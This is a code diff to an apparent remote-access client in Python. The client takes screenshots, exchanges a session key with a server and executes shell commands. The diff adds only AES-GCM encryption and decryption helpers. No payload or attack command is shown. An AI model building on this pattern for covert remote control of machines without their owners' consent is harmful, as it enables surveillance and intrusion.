@@ -6,7 +6,7 @@ import os
 import json
 import mss
 from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
+from Crypto.Cipher import PKCS1_OAEP, AES
 from Crypto.Random import get_random_bytes
 
 # Track the current working directory (starting with the root or default directory)
@@ -219,6 +219,72 @@ def aes_session_key_function(client_id, SERVER_URL, cert_path="cert.pem"):
 aes_key = aes_session_key_function(client_id,SERVER_URL)
 if aes_key:
     print(f"AES session key generated and shared: {aes_key.hex()}")
+
+def encrypt_data(aes_key, data):
+    """
+    Encrypt data (text or file) using AES-GCM with the provided AES key.
+    
+    Args:
+        aes_key (bytes): The 256-bit AES key.
+        data (str or bytes): The data to encrypt (string for text, bytes for files).
+    
+    Returns:
+        dict: Dictionary with nonce, ciphertext, and tag (all hex-encoded), or None if failed.
+    """
+    try:
+        # Convert input to bytes
+        if isinstance(data, str):
+            data_bytes = data.encode('utf-8')
+        elif isinstance(data, bytes):
+            data_bytes = data
+        else:
+            raise ValueError("Data must be string or bytes")
+
+        # Generate a 12-byte nonce for AES-GCM
+        nonce = get_random_bytes(12)
+
+        # Create AES-GCM cipher and encrypt
+        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
+        ciphertext, tag = cipher.encrypt_and_digest(data_bytes)
+
+        # Return hex-encoded values for JSON compatibility
+        return {
+            "nonce": nonce.hex(),
+            "ciphertext": ciphertext.hex(),
+            "tag": tag.hex()
+        }
+    except Exception as e:
+        print(f"Error in encrypt_data: {e}")
+        return None
+
+
+def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
+    """
+    Decrypt data (text or file) encrypted with AES-GCM using the provided AES key.
+    
+    Args:
+        aes_key (bytes): The 256-bit AES key.
+        nonce_hex (str): The hex-encoded nonce from encryption.
+        ciphertext_hex (str): The hex-encoded ciphertext from encryption.
+        tag_hex (str): The hex-encoded authentication tag from encryption.
+    
+    Returns:
+        bytes: Decrypted data (bytes, caller can decode to string for text), or None if failed.
+    """
+    try:
+        # Convert hex strings to bytes
+        nonce = bytes.fromhex(nonce_hex)
+        ciphertext = bytes.fromhex(ciphertext_hex)
+        tag = bytes.fromhex(tag_hex)
+
+        # Create AES-GCM cipher and decrypt
+        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
+        plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)
+
+        return plaintext_bytes
+    except Exception as e:
+        print(f"Error in decrypt_data: {e}")
+        return None
 
 def execute_command(command):
     """Execute the shell command, update current directory if 'cd' command is issued."""
